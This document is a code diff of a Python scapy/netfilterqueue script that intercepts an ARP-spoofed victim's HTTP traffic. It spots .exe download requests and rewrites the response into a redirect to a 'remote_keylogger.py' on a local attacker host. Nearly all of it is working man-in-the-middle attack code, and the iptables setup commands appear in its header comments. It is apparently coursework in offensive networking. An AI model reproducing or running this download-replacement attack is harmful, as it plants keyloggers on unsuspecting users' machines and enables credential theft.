@@ -7,39 +7,48 @@
 #iptables -I OUTPUT -j NFQUEUE --queue-num 0 to run on own computer, iptables --flush to reset
 #iptables -I FORWARD -j NFQUEUE --queue-num 0 to run on arp spoofed computer
 
-import netfilterqueue
 import scapy.all as scapy
+import netfilterqueue
+ 
+ack_lst = []
+ 
+ 
+def deloptions(replace_sPkt):
+    del replace_sPkt[scapy.IP].len
+    del replace_sPkt[scapy.IP].chksum
+    del replace_sPkt[scapy.TCP].chksum
+    return replace_sPkt
+ 
+ 
+def replace_download(pkt):
+    replace_sPkt = scapy.IP(pkt.get_payload())
+    if replace_sPkt.haslayer(scapy.Raw):
+        if replace_sPkt[scapy.TCP].dport == 80:
+            #print("[+] HTTP Request")
+            if ".exe" in replace_sPkt[scapy.Raw].load:
+                print("[+] Detected an exe download request")
+                ack_lst.append(replace_sPkt[scapy.TCP].ack)
+        elif replace_sPkt[scapy.TCP].sport == 80:
+            #print("[+] HTTP Response")
+            if replace_sPkt[scapy.TCP].seq in ack_lst:
+                ack_lst.remove(replace_sPkt[scapy.TCP].seq)
+                print("[+] Replacing File")
+                #replace_url = "http://10.0.2.6/evil_stuff/remote_keylogger.py"
+                replace_sPkt[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\r\nLocation: http://10.0.2.6/evil_stuff/remote_keylogger.py\n\n"
+ 
+                modified_pkt = deloptions(replace_sPkt)
+                pkt.set_payload(str(modified_pkt))
 
+    pkt.accept()
 
-ack_list = []
+def packet_show(pkt):
+    print("[+] Printing Packets")
+    scapy_pkt = scapy.IP(pkt.get_payload())
+    print(scapy_pkt.show())
 
-def set_load(packet, load):
-    packet[scapy.Raw].load =  load
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.TCP].chksum
-    return packet
-
-def process_packet(packet):
-    #change packet to scapy packet
-    scapy_packet = scapy.IP(packet.get_payload())
-    if scapy_packet.haslayer(scapy.Raw):
-        if scapy_packet[scapy.TCP].dport == 10000: # set to 10000 when sslstrip
-            # to avoid loops in sslstrip, check for exe file we want them to download in quotes
-            if ".exe" in scapy_packet[scapy.Raw].load and "" not in scapy_packet[scapy.Raw].load:
-                print("[+] exe Request")
-                ack_list.append(scapy_packet[TCP].ack)
-        elif scapy_packet[scapy.TCP].sport == 10000: # set 10000 when sslstrip, 80 otherwise
-            if scapy_packet[TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[TCP].seq)
-                print("[+] Replacing file")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: \n\n") # any exe i want
-
-                #reset scapy packet to regular packet
-                packet.set_payload(str(modified_packet))
-
-    packet.accept()
-
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
+#try:
+nfqueue = netfilterqueue.NetfilterQueue()
+nfqueue.bind(0, replace_download)
+nfqueue.run()
+#except KeyboardInterrupt:
+    #print("\n\n[+] Detected 'ctrl + c' ... Quitting ...!!!
